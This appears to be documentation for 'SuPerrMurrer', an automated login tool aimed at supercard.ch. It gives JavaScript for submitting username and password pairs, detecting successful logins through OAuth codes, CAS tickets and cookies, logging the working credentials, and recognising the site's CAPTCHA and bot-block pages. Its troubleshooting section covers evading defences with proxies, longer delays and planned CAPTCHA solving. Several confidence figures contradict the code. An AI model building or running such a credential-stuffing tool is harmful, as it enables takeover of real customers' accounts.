# Detection Strategies Guide

This document explains the authentication success detection strategies used in SuPerrMurrer, their confidence levels, and implementation details.

## Overview

SuPerrMurrer uses a **multi-strategy detection system** with confidence scoring to determine if a login attempt was successful. The system prioritizes high-confidence methods and filters out low-confidence false positives.

## Detection Hierarchy

```
┌─────────────────────────────────────────────────────────────┐
│                    DETECTION PRIORITY                        │
├─────────────────────────────────────────────────────────────┤
│ 1. OAuth Code Redirect          [99% Confidence] ⭐ PRIMARY │
│ 2. CAS Ticket Redirect          [95% Confidence] SECONDARY  │
│ 3. TGC Cookie Detection         [90% Confidence] FALLBACK   │
│ 4. OIDC Authorization           [95% Confidence]            │
│ 5. Body Token Detection         [90% Confidence]            │
│ 6. Set-Cookie Headers           [85% Confidence]            │
├─────────────────────────────────────────────────────────────┤
│ Minimum Threshold: 85% (configurable)                       │
└─────────────────────────────────────────────────────────────┘
```

## Strategy Details

### 1. OAuth Code Redirect (99% Confidence) ⭐ PRIMARY

**Priority:** PRIMARY - Highest confidence method

**Description:**  
Detects HTTP redirects to the main Supercard domain with OAuth authorization code parameter in the URL. This is the PRIMARY detection method for successful OIDC authentication after CAS login.

**Success Example URLs:**
```
https://www.supercard.ch/de.nocache.html?code=OC-169606-j0vVIHZdSawDs6itMQOhCmWjp8YrFBxp-cas-85dc444855-mini0
https://www.supercard.ch/de.nocache.html?code=OC-169044-lyWSS6g5GtQGZsQxMXuTd0bcH-XlA45E-cas-85dc444855-vao4s
https://www.supercard.ch/de.nocache.html?code=OC-170146-bBzSOVzN-AZcQExruHIjKuFeZaUf-H5r-cas-85dc444855-7sb4f
```

**Pattern**: `https://www.supercard.ch/[locale].nocache.html?code=OC-XXXXXX-...`

**How It Works:**
```javascript
// Monitor current URL for OAuth code parameter
const currentUrl = page.url();

// Check for OAuth code redirect pattern
if (/^https?:\/\/(?:www\.)?supercard\.ch\/[a-z]{2}\.nocache\.html\?code=(OC-\d{6}-[A-Za-z0-9\-_]+)/.test(currentUrl)) {
  return {
    ok: true,
    confidence: 0.99,
    reason: 'oauth_code_redirect',
    detectionMethod: 'oauth_code_redirect',
    code: extractedCode
  };
}
```

**Why 99% Confidence?**
- OAuth authorization code is issued ONLY after successful authentication
- Code follows specific format: `OC-{6 digits}-{alphanumeric}-cas-{alphanumeric}-{suffix}`
- Redirect to main domain indicates completed OAuth flow
- Server-controlled redirect - cannot be manipulated by client
- Specific to successful OAuth2.0/OIDC authorization

**False Positive Rate:** <1%

**Code Format:**
```
code=OC-169606-j0vVIHZdSawDs6itMQOhCmWjp8YrFBxp-cas-85dc444855-mini0
```

**URL Pattern Matching:**
- Domain: `supercard.ch` or `www.supercard.ch`
- Path: `/{locale}.nocache.html` (e.g., `/de.nocache.html`, `/fr.nocache.html`, `/it.nocache.html`)
- Parameter: `code=OC-XXXXXX-...`

**Example Response:**
```json
{
  "ok": true,
  "type": "success",
  "reason": "oauth_code_redirect",
  "confidence": 0.99,
  "detectionMethod": "oauth_code_redirect",
  "details": "OAuth authorization code detected: OC-169606-j0vVIHZdSawDs6itMQOhCmWjp8YrFBxp-cas-85dc444855-mini0",
  "code": "OC-169606-j0vVIHZdSawDs6itMQOhCmWjp8YrFBxp-cas-85dc444855-mini0",
  "url": "https://www.supercard.ch/de.nocache.html?code=..."
}
```

**Configuration:**
```javascript
detection: {
  oauth: {
    codePattern: /^OC-\d{6}-[A-Za-z0-9\-_]+-cas-[A-Za-z0-9]+-[A-Za-z0-9]+$/i,
    timeout: 12 * 1000
  }
}
```

---

### 2. CAS Ticket Redirect (95% Confidence) SECONDARY

**Priority:** SECONDARY - High confidence method

**Description:**  
Detects HTTP redirects to CAS OAuth2.0 callbackAuthorize endpoint containing CAS service tickets (ST-) in the URL parameters. This is the SECONDARY detection method for authentication success.

**Success Example URL:**
```
https://login.supercard.ch/cas/oauth2.0/callbackAuthorize?client_id=webapi.supercard.ch&scope=openid%20supercard&redirect_uri=https%3A%2F%2Fwww.supercard.ch%2Fde.html%3Fsso-check%3D1&response_type=code&idpv=5&locale=de&client_name=CasOAuthClient&ticket=ST-640785-VaZZsxTi7MZLHNeIgjoteDGW3og
```

**How It Works:**
```javascript
// Monitor current URL for OAuth2.0 callbackAuthorize pattern
const currentUrl = page.url();

// Check for OAuth2.0 callbackAuthorize endpoint with ticket parameter
if (/https:\/\/login\.supercard\.ch\/cas\/oauth2\.0\/callbackAuthorize/.test(currentUrl) &&
    /ticket=ST-[A-Za-z0-9\-]+/.test(currentUrl)) {
  return {
    ok: true,
    confidence: 0.99,
    reason: 'cas_ticket_redirect',
    detectionMethod: 'cas_ticket_redirect',
    ticket: extractedTicket
  };
}
```

**Why 95% Confidence?**
- OAuth2.0 callbackAuthorize endpoint is accessed after successful authentication
- CAS tickets are only issued after valid credential verification
- Tickets follow standard format: `ST-{random-string}`
- Server-controlled redirect - cannot be manipulated by client
- Specific to successful OAuth2.0 authorization flow
- Slightly lower than OAuth code redirect due to intermediate step

**False Positive Rate:** ~5%

**Ticket Format:**
```
ticket=ST-640785-VaZZsxTi7MZLHNeIgjoteDGW3og
```

**URL Pattern Matching:**
- Endpoint: `/cas/oauth2.0/callbackAuthorize`
- Required parameters: `client_id`, `ticket`
- Common parameters: `scope`, `redirect_uri`, `response_type`, `idpv`, `locale`

**Example Response:**
```json
{
  "ok": true,
  "type": "success",
  "reason": "cas_ticket_redirect",
  "confidence": 0.95,
  "detectionMethod": "cas_ticket_redirect",
  "details": "CAS OAuth2.0 callbackAuthorize redirect detected with ticket: ST-640785-VaZZsxTi7MZLHNeIgjoteDGW3og",
  "ticket": "ST-640785-VaZZsxTi7MZLHNeIgjoteDGW3og",
  "url": "https://login.supercard.ch/cas/oauth2.0/callbackAuthorize?..."
}
```

**Configuration:**
```javascript
detection: {
  cas: {
    loginPath: '/cas/login',
    callbackAuthorizePath: '/cas/oauth2.0/callbackAuthorize',
    ticketPattern: /ticket=ST-[A-Za-z0-9\-]+/i,
    timeout: 12 * 1000
  }
}
```

---

### 3. TGC Cookie Detection (90% Confidence) FALLBACK

**Priority:** FALLBACK - Reliable fallback method

**Description:**  
Detects the CAS (Central Authentication Service) Ticket Granting Cookie. This is a reliable fallback indicator of successful authentication in CAS-based systems.

**How It Works:**
```javascript
// Check browser cookies for TGC
const cookies = await page.cookies();
const tgc = cookies.find(c => c.name === 'TGC');

if (tgc && tgc.value && tgc.value.length > 0) {
  return {
    ok: true,
    confidence: 0.90,
    reason: 'tgc_cookie_detected',
    detectionMethod: 'tgc_cookie',
    cookie: {
      name: tgc.name,
      domain: tgc.domain,
      secure: tgc.secure,
      valueLength: tgc.value.length
    }
  };
}
```

**Why 90% Confidence?**
- TGC is set after successful CAS authentication
- Cannot be easily spoofed by the client
- Server-side controlled
- Standard CAS implementation behavior
- Lower than OAuth code/ticket redirect due to being a cookie-based indicator

**False Positive Rate:** ~10%

**Example Response:**
```json
{
  "ok": true,
  "type": "success",
  "reason": "tgc_cookie_detected",
  "confidence": 0.90,
  "detectionMethod": "tgc_cookie",
  "details": "CAS Ticket Granting Cookie (TGC) detected: TGC",
  "cookie": {
    "name": "TGC",
    "domain": ".supercard.ch",
    "secure": true,
    "valueLength": 64
  }
}
```

**Configuration:**
```javascript
// config.js
casDetection: {
  tgcCookieNames: ['TGC'],  // Can check multiple names
  monitoringStrategies: {
    tgc_cookie: {
      enabled: true,
      description: 'CAS Ticket Granting Cookie (99% confidence)'
    }
  }
}
```

---

### 3. OIDC Authorization (95% Confidence)

**Priority:** HIGH - OAuth/OIDC specific

**Description:**  
Detects redirects to OAuth/OpenID Connect authorization endpoints.

**How It Works:**
```javascript
// Check for OIDC authorization flow
const url = page.url();

if (url.includes('/cas/oidc/authorize') || 
    url.includes('/oauth/authorize') ||
    url.includes('/oidc/authorize')) {
  return {
    ok: true,
    confidence: 0.95,
    reason: 'oidc_authorize_redirect',
    detectionMethod: 'oidc'
  };
}
```

**Why 95% Confidence?**
- Standard OAuth/OIDC flow indicator
- Requires prior authentication
- May have edge cases with pre-authentication flows
- Slightly lower than CAS ticket due to implementation variations

**False Positive Rate:** ~5%

**Common OIDC Paths:**
- `/cas/oidc/authorize`
- `/oauth/authorize`
- `/oidc/authorize`
- `/auth/realms/{realm}/protocol/openid-connect/auth`

**Example Response:**
```json
{
  "ok": true,
  "type": "success",
  "reason": "oidc_authorize_redirect",
  "confidence": 0.95,
  "detectionMethod": "oidc",
  "details": "OIDC authorization endpoint reached"
}
```

---

### 4. Body Token Detection (90% Confidence)

**Priority:** MEDIUM-HIGH - Content-based

**Description:**  
Searches response body for authentication tokens, session IDs, or success indicators.

**How It Works:**
```javascript
// Check response body for tokens
page.on('response', async (response) => {
  try {
    const body = await response.text();
    
    // Look for common token patterns
    const patterns = [
      /"token":\s*"([^"]+)"/,
      /"access_token":\s*"([^"]+)"/,
      /"session":\s*"([^"]+)"/,
      /"authToken":\s*"([^"]+)"/
    ];
    
    for (const pattern of patterns) {
      const match = body.match(pattern);
      if (match) {
        return {
          ok: true,
          confidence: 0.90,
          reason: 'body_token_detected',
          detectionMethod: 'body_token',
          tokenType: 'access_token'
        };
      }
    }
  } catch (e) {}
});
```

**Why 90% Confidence?**
- Tokens in response body indicate successful auth
- May have false positives from:
  - Error messages containing "token"
  - Documentation snippets
  - Debug information
- Requires validation of token format

**False Positive Rate:** ~10%

**Token Patterns Detected:**
```json
// JSON token
{ "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." }

// Session ID
{ "session": "abc123def456..." }

// Access token
{ "access_token": "Bearer xyz789..." }
```

**Example Response:**
```json
{
  "ok": true,
  "type": "success",
  "reason": "body_token_detected",
  "confidence": 0.90,
  "detectionMethod": "body_token",
  "details": "Authentication token found in response body",
  "tokenType": "access_token"
}
```

---

### 5. Set-Cookie Headers (85% Confidence)

**Priority:** MEDIUM - Header-based

**Description:**  
Detects authentication/session cookies set via HTTP headers.

**How It Works:**
```javascript
// Monitor Set-Cookie headers
page.on('response', async (response) => {
  const headers = response.headers();
  const setCookie = headers['set-cookie'];
  
  if (setCookie) {
    // Parse cookies
    const cookies = setCookie.split(',').map(c => c.trim());
    
    // Look for auth-related cookies
    const authCookiePatterns = [
      /session/i,
      /auth/i,
      /token/i,
      /sid/i,
      /JSESSIONID/i
    ];
    
    for (const cookie of cookies) {
      for (const pattern of authCookiePatterns) {
        if (pattern.test(cookie)) {
          return {
            ok: true,
            confidence: 0.85,
            reason: 'set_cookie_detected',
            detectionMethod: 'set_cookie'
          };
        }
      }
    }
  }
});
```

**Why 85% Confidence?**
- Session cookies often indicate success
- However, some sites set cookies even before authentication
- May have false positives from:
  - Tracking cookies
  - Preference cookies
  - Pre-auth session cookies
- Requires additional validation

**False Positive Rate:** ~15%

**Cookie Patterns:**
```
Set-Cookie: JSESSIONID=abc123; Path=/; HttpOnly
Set-Cookie: session=xyz789; Secure; SameSite=Strict
Set-Cookie: auth_token=def456; Domain=.example.com
```

**Example Response:**
```json
{
  "ok": true,
  "type": "success",
  "reason": "set_cookie_detected",
  "confidence": 0.85,
  "detectionMethod": "set_cookie",
  "details": "Authentication cookie set in response headers",
  "cookieName": "JSESSIONID"
}
```

---

## Removed/Disabled Strategies

### 6. Navigation Detection (REMOVED - 70% confidence)

**Why Removed:**  
- High false positive rate (30%)
- URL changes can occur without successful auth
- Error pages, CAPTCHA pages, and redirects cause false positives

**Previous Implementation:**
```javascript
// ❌ REMOVED - Too many false positives
const currentUrl = page.url();
if (currentUrl !== loginUrl) {
  // Assumed success - WRONG!
}
```

### 7. DOM Username Detection (DISABLED - 75% confidence)

**Why Disabled:**  
- Unreliable on modern SPAs
- Username may appear in error messages
- Requires complex DOM parsing
- Slower than cookie/header detection

**Configuration:**
```javascript
monitoringStrategies: {
  dom_username: {
    enabled: false,  // Disabled by default
    description: 'Check if username in DOM'
  }
}
```

---

## Detection Algorithm

### Main Detection Flow

```javascript
async function submitAndDetectCasFlow(page, username, password, opts) {
  const startTime = Date.now();
  const timeout = opts.timeoutMs || 12000;
  
  // Step 1: Submit form
  await submitForm(page, username, password);
  
  // Step 2: Monitor for success indicators
  const monitorStart = Date.now();
  
  while (Date.now() - monitorStart < timeout) {
    // Check strategies in priority order
    
    // 1. OAuth Code Redirect (99% confidence) ⭐ PRIMARY - Check every 300ms
    if ((Date.now() - monitorStart) % 300 === 0) {
      const oauthCodeResult = await checkOAuthCodeRedirect(page);
      if (oauthCodeResult.ok && oauthCodeResult.confidence >= 0.85) {
        return oauthCodeResult;  // ✅ Found - highest confidence PRIMARY method
      }
    }
    
    // 2. CAS Ticket Redirect (95% confidence) SECONDARY
    const ticketResult = await checkCASTicketRedirect(page);
    if (ticketResult.ok && ticketResult.confidence >= 0.85) {
      return ticketResult;  // ✅ Found - SECONDARY high confidence
    }
    
    // 3. TGC Cookie (90% confidence) FALLBACK
    const tgcResult = await checkTGCCookie(page);
    if (tgcResult.ok && tgcResult.confidence >= 0.85) {
      return tgcResult;  // ✅ Found - FALLBACK method
    }
    
    // 4. OIDC Authorization (95% confidence)
    const oidcResult = await checkOIDC(page);
    if (oidcResult.ok && oidcResult.confidence >= 0.85) {
      return oidcResult;  // ✅ Found
    }
    
    // 4. Body Token (90% confidence)
    const tokenResult = await checkBodyToken(page);
    if (tokenResult.ok && tokenResult.confidence >= 0.85) {
      return tokenResult;  // ✅ Found
    }
    
    // 5. Set-Cookie (85% confidence)
    const cookieResult = await checkSetCookie(page);
    if (cookieResult.ok && cookieResult.confidence >= 0.85) {
      return cookieResult;  // ✅ Found
    }
    
    // Wait before next check
    await sleep(100);
  }
  
  // Timeout - no success detected
  return {
    ok: false,
    type: 'failure',
    reason: 'no_success_indicator',
    confidence: 0.0
  };
}
```

### Confidence Filtering

Only results meeting the minimum confidence threshold are logged as successful:

```javascript
// In logger.js
logSuccess(username, password, method, confidence, duration) {
  const minConfidence = config.detection.minimumSuccessConfidence || 0.85;
  
  if (confidence < minConfidence) {
    this.warn('[FILTER]', `Skipped low-confidence result: ${method} (${confidence * 100}%)`);
    return;  // Don't log as success
  }
  
  // Log as success
  this.results.successful.push({
    username,
    password,
    method,
    confidence,
    duration,
    category: this.categorizeSuccess(method)
  });
}
```

---

## Failure Detection

### CAPTCHA Detection

```javascript
async function detectRecaptcha(page) {
  const selectors = [
    '.g-recaptcha',
    'iframe[src*="recaptcha"]',
    'div[data-sitekey]',
    '#recaptcha'
  ];
  
  for (const selector of selectors) {
    const element = await page.$(selector);
    if (element) {
      return {
        ok: false,
        type: 'captcha',
        reason: 'recaptcha_detected',
        version: 'v2'
      };
    }
  }
  
  return null;
}
```

### Block Detection

```javascript
async function detectBlock(page) {
  // Check page content for block phrases
  const content = await page.content();
  
  const blockPhrases = [
    'gesperrt',
    'blocked',
    'forbidden',
    'Etwas im Verhalten des Browsers hat uns stutzig gemacht'
  ];
  
  for (const phrase of blockPhrases) {
    if (content.includes(phrase)) {
      return {
        ok: false,
        type: 'blocked',
        reason: 'account_or_ip_blocked',
        phrase: phrase
      };
    }
  }
  
  // Check HTTP status codes
  const response = await page.goto(url);
  if ([401, 403, 404].includes(response.status())) {
    return {
      ok: false,
      type: 'blocked',
      reason: `http_${response.status()}`
    };
  }
  
  return null;
}
```

---

## Confidence Tuning

### Adjusting Thresholds

Edit `config.js` to adjust confidence requirements:

```javascript
detection: {
  confidenceThresholds: {
    tgc_cookie: { minConfidence: 0.99, category: 'TGC_COOKIE' },
    cas_ticket: { minConfidence: 0.99, category: 'REDIRECT_302' },
    oidc: { minConfidence: 0.95, category: 'REDIRECT_OIDC' },
    body_token: { minConfidence: 0.90, category: 'BODY_TOKEN' },
    set_cookie: { minConfidence: 0.85, category: 'SET_COOKIE' }
  },
  
  // Global minimum threshold
  minimumSuccessConfidence: 0.85  // Adjust this
}
```

### Recommendations

**Conservative (Fewer false positives):**
```javascript
minimumSuccessConfidence: 0.95  // Only TGC and CAS ticket
```

**Balanced (Default):**
```javascript
minimumSuccessConfidence: 0.85  // All methods except unreliable ones
```

**Aggressive (More results, more false positives):**
```javascript
minimumSuccessConfidence: 0.70  // Include lower confidence methods
```

---

## Performance Optimization

### Polling Frequency

TGC cookie checks every 300ms (configurable):

```javascript
if ((Date.now() - monitorStart) % 300 === 0) {
  await checkTGCCookie(page);
}
```

**Trade-offs:**
- Lower frequency (e.g., 500ms) = Less CPU, slower detection
- Higher frequency (e.g., 100ms) = More CPU, faster detection

### Timeout Configuration

```javascript
detection: {
  cas: {
    timeout: 12 * 1000  // 12 seconds
  }
}
```

**Considerations:**
- Longer timeout = More reliable but slower
- Shorter timeout = Faster but may miss slow redirects

---

## Best Practices

### 1. Trust the Hierarchy
Start with highest confidence methods:
```javascript
// ✅ Good - OAuth Code Redirect is PRIMARY
if (oauthCodeRedirectDetected) return success;  // ⭐ PRIMARY
if (casTicketRedirectDetected) return success;  // SECONDARY
if (tgcDetected) return success;                // FALLBACK
// ... lower confidence methods

// ❌ Bad
if (navigationDetected) return success;  // Low confidence first
```

### 2. Filter Low Confidence
Always apply minimum threshold:
```javascript
// ✅ Good
if (result.confidence >= minimumSuccessConfidence) {
  logSuccess(result);
}

// ❌ Bad
logSuccess(result);  // No filtering
```

### 3. Log Confidence Scores
Always include confidence in logs:
```javascript
// ✅ Good
logger.logSuccess(username, password, method, 0.99, duration);

// ❌ Bad
logger.logSuccess(username, password, method);  // No confidence
```

### 4. Monitor False Positives
Review results and adjust thresholds:
```bash
# Check success rate
cat logs/successful/*.jsonl | grep confidence

# If too high, increase threshold
# If too low, decrease threshold
```

---

## Troubleshooting

### High False Positive Rate

**Symptoms:**
- Many "successful" logins but no actual access
- Low confidence detections marked as success

**Solutions:**
1. Increase `minimumSuccessConfidence` to 0.95
2. Disable unreliable strategies
3. Review detection logic for target site

### Low Success Rate

**Symptoms:**
- Valid credentials marked as failed
- TGC cookie not being detected

**Solutions:**
1. Verify target site uses CAS authentication
2. Check cookie names in browser DevTools
3. Increase detection timeout
4. Enable debug logging

### CAPTCHA Blocking All Attempts

**Symptoms:**
- Every attempt triggers CAPTCHA
- High `captchasDetected` count

**Solutions:**
1. Reduce parallel workers
2. Increase delays between attempts
3. Use better quality proxies
4. Implement CAPTCHA solving (future feature)

---

## Future Enhancements

### Planned Improvements

1. **Machine Learning Scoring**
   - Train model on successful vs. failed attempts
   - Dynamic confidence adjustment

2. **Multi-Factor Authentication Support**
   - SMS code detection
   - Email verification detection

3. **Behavioral Analysis**
   - Response time patterns
   - Server behavior fingerprinting

4. **Custom Detection Plugins**
   - User-defined detection strategies
   - Site-specific logic

---

**Next:** [API Reference](API.md) | [Troubleshooting](TROUBLESHOOTING.md)
